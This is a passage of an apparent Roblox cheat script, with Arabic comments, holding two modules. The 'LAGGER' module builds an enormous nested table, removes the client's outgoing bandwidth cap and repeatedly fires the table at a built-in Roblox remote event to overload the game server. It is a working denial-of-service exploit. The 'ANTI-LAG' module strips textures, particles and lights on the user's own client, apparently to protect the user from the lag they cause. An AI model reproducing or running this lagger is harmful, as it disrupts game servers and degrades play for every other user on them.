-- ═══════════════════════════════════════════════════════════════
-- SYSTEM 11: LAGGER (محسن - خفيف على المستخدم)
-- ═══════════════════════════════════════════════════════════════
local isMobileDevice = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

local LAGGER_CONFIG = isMobileDevice and {
    TableIncrease = 200,
    Tries = 1,
    LoopWaitTime = 1.5
} or {
    TableIncrease = 200,
    Tries = 1,
    LoopWaitTime = 0.5
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then
            obj = obj[segment]
        else
            return nil
        end
    end
    return obj
end

local function getmaxvalue(val)
    if type(val) ~= "number" then return nil end
    return 499999 / (val + 2)
end

-- نبني الجدول مرة واحدة فقط ونستخدمه مرارا (يقلل RAM/CPU)
local preBuiltBomb = nil
local bombBuilt = false

local function buildBombOnce()
    if bombBuilt then return end
    bombBuilt = true
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    local tableincrease = LAGGER_CONFIG.TableIncrease
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 10000 == 0 then task.wait() end
    end
    preBuiltBomb = maintable
end

local laggerActive = false
local laggerThread = nil

local function startLaggerLoop()
    buildBombOnce()
    while laggerActive do
        pcall(function()
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        end)
        if preBuiltBomb then
            local remote = resolveRemote(CUSTOM_REMOTE_PATH)
            if remote then
                pcall(function()
                    if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                        remote:FireServer(preBuiltBomb)
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer(preBuiltBomb)
                    end
                end)
            end
        end
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.5))
    end
end

function startLagger()
    if laggerThread then return end
    laggerActive = true
    laggerThread = task.spawn(startLaggerLoop)
end

function stopLagger()
    laggerActive = false
    laggerThread = nil
    pcall(function()
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(1000)
    end)
end

-- ═══════════════════════════════════════════════════════════════
-- SYSTEM 12: ANTI-LAG R (حماية شاملة للكلينت من اللاق)
-- ═══════════════════════════════════════════════════════════════
local antiLagCleanupDone = false
local antiLagWatcherConn = nil

function startAntiLag()
    if Connections.antiLag then return end

    -- تنظيف شامل لمرة واحدة
    if not antiLagCleanupDone then
        antiLagCleanupDone = true
        task.spawn(function()
            local descs = workspace:GetDescendants()
            for i = 1, #descs, 100 do
                for j = i, math.min(i + 99, #descs) do
                    local v = descs[j]
                    pcall(function()
                        if v:IsA("Texture") or v:IsA("Decal") then
                            v:Destroy()
                        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("Beam") then
                            v:Destroy()
                        elseif v:IsA("PointLight") or v:IsA("SurfaceLight") or v:IsA("SpotLight") then
                            v:Destroy()
                        elseif v:IsA("SpecialMesh") then
                            v.MeshId = ""
                            v.TextureId = ""
                        elseif v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
                            if v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
                                v.Material = Enum.Material.SmoothPlastic
                            end
                            if v:IsA("MeshPart") then
                                v.RenderFidelity = Enum.RenderFidelity.Performance
                            end
                        elseif v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("SunRaysEffect") then
                            if not v:GetAttribute("AETHER_HUB") then
                                v:Destroy()
                            end
                        end
                    end)
                end
                if i % 500 == 0 then task.wait() end
            end
            -- قلل الـ Fog و الاضاءة
            pcall(function()
                Lighting.FogEnd = 100000
                Lighting.FogStart = 0
                Lighting.GlobalShadows = false
            end)
        end)
    end

    -- مراقبة العناصر الجديدة الثقيلة
    if not antiLagWatcherConn then
        antiLagWatcherConn = workspace.DescendantAdded:Connect(function(v)
            if not Enabled.AntiLag then return end
            task.defer(function()
                pcall(function()
                    if v:IsA("Texture") or v:IsA("Decal") then
                        v:Destroy()
                    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("Beam") then
                        v:Destroy()
                    elseif v:IsA("PointLight") or v:IsA("SurfaceLight") or v:IsA("SpotLight") then
                        v:Destroy()
                    elseif v:IsA("SpecialMesh") then
                        v.MeshId = ""
                        v.TextureId = ""
                    elseif v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
                        if v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
                            v.Material = Enum.Material.SmoothPlastic
                        end
                        if v:IsA("MeshPart") then
                            v.RenderFidelity = Enum.RenderFidelity.Performance
                        end
                    elseif v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("SunRaysEffect") then
                        if not v:GetAttribute("AETHER_HUB") then
                            v:Destroy()
                        end
                    end
                end)
            end)
        end)
    end

    -- تنظيف مستمر - حماية الشخصية وتقليل التأثيرات
    Connections.antiLag = RunService.Heartbeat:Connect(function()
        if not Enabled.AntiLag then return end
        pcall(function()
            local char = Player.Character
            if not char then return end
            for _, v in pairs(char:GetDescendants()) do
                if v:IsA("ParticleEmitter") then
                    v.Rate = 0
                    v.Enabled = false
                elseif v:IsA("Trail") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("Beam") then
                    v.Enabled = false
                elseif v:IsA("PointLight") or v:IsA("SurfaceLight") or v:IsA("SpotLight") then
                    v.Enabled = false
                end
            end
        end)
    end)
end

function stopAntiLag()
    if Connections.antiLag then
        Connections.antiLag:Disconnect()
        Connections.antiLag = nil
    end
end

